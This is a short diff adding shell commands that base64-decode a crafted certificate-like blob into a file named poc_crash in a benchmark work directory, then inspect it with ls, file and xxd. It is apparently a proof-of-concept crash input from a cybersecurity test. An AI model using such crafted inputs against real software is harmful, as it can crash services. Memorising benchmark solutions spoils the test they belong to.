@@ -1,0 +1,4 @@
+cd /tmp && echo -n "MIHwMIHXoAMCAQICAQEwDQYJKoZIhvcNAQELBQAwDzENMAsGA1UEAwwEdGVzdDAeFw0yMzAxMDEwMDAwMDBaFw00OTAxMDEwMDAwMDBaMA8xDTALBgNVBAMMBHRlc3QwXDANBgkqhkiG9w0BAQEFAANLADBIAkEAw8+chgmsUFIAmmIWI0rf0FGuTL87M3yXJ85fWx4iDqFXqZKKGh93M+m9Yz+mzs+dHgfu6Q69QCCUIWq1lWpcPQIDAQABox4wHDAaBgNVHREEEzARoA8GCCsGAQUFBwgHoAMBAf8wDQYJKoZIhvcNAQELBQADBQABAgME" | base64 -d > /CybinGym_workdir/poc_crash
+ls -la /CybinGym_workdir/poc_crash
+file /CybinGym_workdir/poc_crash
+xxd /CybinGym_workdir/poc_crash | tail -4
